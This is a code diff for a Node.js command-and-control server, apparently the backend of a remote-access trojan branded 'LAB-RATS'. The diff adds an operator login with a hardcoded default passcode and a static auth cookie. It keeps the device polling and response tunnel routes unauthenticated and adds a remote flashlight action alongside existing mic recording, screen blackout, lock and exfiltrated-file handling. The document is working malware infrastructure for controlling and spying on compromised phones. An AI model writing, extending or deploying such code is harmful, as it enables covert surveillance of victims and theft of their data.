@@ -5,6 +5,7 @@ const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
+const C2_PASSWORD = process.env.C2_PASSWORD || 'admin1337';
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
@@ -83,6 +84,11 @@ function getCookie(cookieHeader, name) {
     return matches ? decodeURIComponent(matches[1]) : null;
 }
 
+function isAuthenticated(req) {
+    const token = getCookie(req.headers.cookie, 'c2_auth_token');
+    return token === 'AUTH_OK_1337';
+}
+
 function dispatchCommand(deviceId, cmd) {
     let waiters = longPollWaiters.get(deviceId) || [];
     while (waiters.length > 0) {
@@ -96,6 +102,52 @@ function dispatchCommand(deviceId, cmd) {
     commandQueues.get(deviceId).push(cmd);
     return false;
 }
+
+// LOGIN HTML PAGE
+function serveLoginPage(req, res, errorMsg = '') {
+    const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>LAB-RATS | C2 LOGIN</title>
+    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background-color: #02080d; background-image: radial-gradient(circle at 50% 0%, rgba(0,242,255,.16) 0, rgba(0,168,179,.05) 40%, transparent 80%), radial-gradient(circle at 0% 100%, rgba(0,242,255,.09) 0, transparent 50%), radial-gradient(circle at 100% 100%, rgba(0,242,255,.09) 0, transparent 50%), linear-gradient(rgba(0,242,255,.02) 1px, transparent 1px), linear-gradient(90deg, rgba(0,242,255,.02) 1px, transparent 1px); color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; overflow: hidden; padding: 15px; }
+        .login-card { background: rgba(15,15,25,0.75); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); border: 1px solid #00f2ff; padding: 35px 25px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.2); width: 100%; max-width: 450px; position: relative; }
+        .title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.6rem; letter-spacing: 3px; margin-bottom: 20px; color: #00f2ff; line-height: 1.2; text-transform: uppercase; }
+        input[type=password] { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 14px; margin-bottom: 20px; width: 100%; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }
+        input[type=password]:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.3); }
+        button { background: rgba(0,242,255,0.1); border: 1px solid #00f2ff; color: #00f2ff; padding: 14px 28px; width: 100%; border-radius: 8px; font-weight: 900; font-family: 'Orbitron', sans-serif; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; transition: 0.3s; }
+        button:hover { background: #00f2ff; color: #000; box-shadow: 0 0 30px #00f2ff; }
+        .error-msg { color: #ff3131; font-size: 0.75rem; margin-bottom: 15px; font-weight: bold; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <img src="/c2/header_dashboard.png" style="width: 80%; max-width: 320px; height: auto; margin: 0 auto 20px auto; display: block;" alt="LAB-RATS">
+        <div class="title-font">C2 OPERATOR AUTH</div>
+        ${errorMsg ? `<div class="error-msg">${errorMsg}</div>` : ''}
+        <form action="/login" method="POST">
+            <input type="password" name="password" placeholder="ENTER C2 PASSCODE" required autofocus>
+            <button type="submit">AUTHENTICATE</button>
+        </form>
+    </div>
+</body>
+</html>`;
+    res.send(html);
+}
+
+// LOGIN HANDLER
+app.post('/login', (req, res) => {
+    const { password } = req.body || {};
+    if (password === C2_PASSWORD) {
+        res.setHeader('Set-Cookie', 'c2_auth_token=AUTH_OK_1337; Path=/; HttpOnly; SameSite=Lax');
+        return res.redirect('/');
+    }
+    return serveLoginPage(req, res, 'ACCESS DENIED: INVALID C2 PASSCODE');
+});
 
 // Ingestion Handler for device check-ins
 function handleCheckin(req, res) {
@@ -215,7 +267,7 @@ function handleFileUpload(req, res) {
     }
 }
 
-// Check-in & Exfiltration Routes
+// Unauthenticated Device Check-in & Exfiltration Routes
 app.all('/checkin', handleCheckin);
 app.all('/checkin/', handleCheckin);
 app.all('/api/checkin', handleCheckin);
@@ -227,6 +279,65 @@ app.all('/upload/', handleFileUpload);
 app.all('/api/upload', handleFileUpload);
 app.all('/api/upload/', handleFileUpload);
 app.post('/upload', handleFileUpload);
+
+// Device command polling with Instant Long-Polling
+function handleTunnelPoll(req, res) {
+    const id = req.query.deviceId;
+    if (!id) return res.json({});
+
+    if (devices.has(id)) {
+        const dev = devices.get(id);
+        dev.lastSeen = new Date().toISOString();
+    }
+
+    const queue = commandQueues.get(id) || [];
+    if (queue.length > 0) {
+        return res.json(queue.shift());
+    }
+
+    let polls = longPollWaiters.get(id) || [];
+    polls.push(res);
+    longPollWaiters.set(id, polls);
+
+    req.on('close', () => {
+        let list = longPollWaiters.get(id) || [];
+        longPollWaiters.set(id, list.filter(r => r !== res));
+    });
+
+    setTimeout(() => {
+        let list = longPollWaiters.get(id) || [];
+        if (list.includes(res)) {
+            longPollWaiters.set(id, list.filter(r => r !== res));
+            if (!res.headersSent) res.json({});
+        }
+    }, 10000);
+}
+app.get('/tunnel-poll', handleTunnelPoll);
+app.get('/checkin/tunnel-poll', handleTunnelPoll);
+
+// Device command response
+function handleTunnelResponse(req, res) {
+    const data = req.body || {};
+    const pending = pendingResponses.get(data.id);
+    if (pending) {
+        pendingResponses.delete(data.id);
+        const buf = Buffer.from(data.payload || '', 'base64');
+        pending.res.status(data.status || 200);
+        if (data.contentType) pending.res.setHeader('Content-Type', data.contentType);
+        pending.res.send(buf);
+    }
+    res.json({ success: true });
+}
+app.post('/tunnel-response', handleTunnelResponse);
+app.post('/checkin/tunnel-response', handleTunnelResponse);
+
+// AUTHENTICATION GUARD MIDDLEWARE FOR OPERATOR ROUTES
+app.use((req, res, next) => {
+    if (isAuthenticated(req)) {
+        return next();
+    }
+    return serveLoginPage(req, res);
+});
 
 // Delete Exfiltrated File Endpoint
 app.post('/api/delete-exfil', (req, res) => {
@@ -265,58 +376,6 @@ app.post('/api/rename-device', (req, res) => {
         res.status(500).json({ success: false, error: e.message });
     }
 });
-
-// Device command polling with Instant Long-Polling
-function handleTunnelPoll(req, res) {
-    const id = req.query.deviceId;
-    if (!id) return res.json({});
-
-    if (devices.has(id)) {
-        const dev = devices.get(id);
-        dev.lastSeen = new Date().toISOString();
-    }
-
-    const queue = commandQueues.get(id) || [];
-    if (queue.length > 0) {
-        return res.json(queue.shift());
-    }
-
-    // Long-Polling: Hold connection open up to 10s for instant 0ms dispatch
-    let polls = longPollWaiters.get(id) || [];
-    polls.push(res);
-    longPollWaiters.set(id, polls);
-
-    req.on('close', () => {
-        let list = longPollWaiters.get(id) || [];
-        longPollWaiters.set(id, list.filter(r => r !== res));
-    });
-
-    setTimeout(() => {
-        let list = longPollWaiters.get(id) || [];
-        if (list.includes(res)) {
-            longPollWaiters.set(id, list.filter(r => r !== res));
-            if (!res.headersSent) res.json({});
-        }
-    }, 10000);
-}
-app.get('/tunnel-poll', handleTunnelPoll);
-app.get('/checkin/tunnel-poll', handleTunnelPoll);
-
-// Device command response
-function handleTunnelResponse(req, res) {
-    const data = req.body || {};
-    const pending = pendingResponses.get(data.id);
-    if (pending) {
-        pendingResponses.delete(data.id);
-        const buf = Buffer.from(data.payload || '', 'base64');
-        pending.res.status(data.status || 200);
-        if (data.contentType) pending.res.setHeader('Content-Type', data.contentType);
-        pending.res.send(buf);
-    }
-    res.json({ success: true });
-}
-app.post('/tunnel-response', handleTunnelResponse);
-app.post('/checkin/tunnel-response', handleTunnelResponse);
 
 // GET / serves Operator Dashboard HTML or handles GET check-ins
 app.get('/', (req, res) => {
@@ -364,6 +423,7 @@ app.get('/', (req, res) => {
                         <select onchange="dispatchQuickCommand('${d.deviceId}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
                             <option value="" disabled selected>⚡ ACTIONS</option>
                             <option value="mic">🎙️ Record Mic (60s)</option>
+                            <option value="flashlight">🔦 Toggle Flashlight</option>
                             <option value="blackout">🕶️ Toggle Blackout</option>
                             <option value="lock">🔒 Toggle Lock</option>
                             <option value="volume">🔊 Max Vol + Vibrate</option>
@@ -499,6 +559,9 @@ app.get('/', (req, res) => {
         if (action === 'mic') {
             path = '/audio/mic/start?duration=60';
             label = 'Record Mic (60s)';
+        } else if (action === 'flashlight') {
+            path = '/device/flashlight';
+            label = 'Toggle Flashlight';
         } else if (action === 'blackout') {
             path = '/ghost/interact?action=blackout';
             label = 'Toggle Blackout';
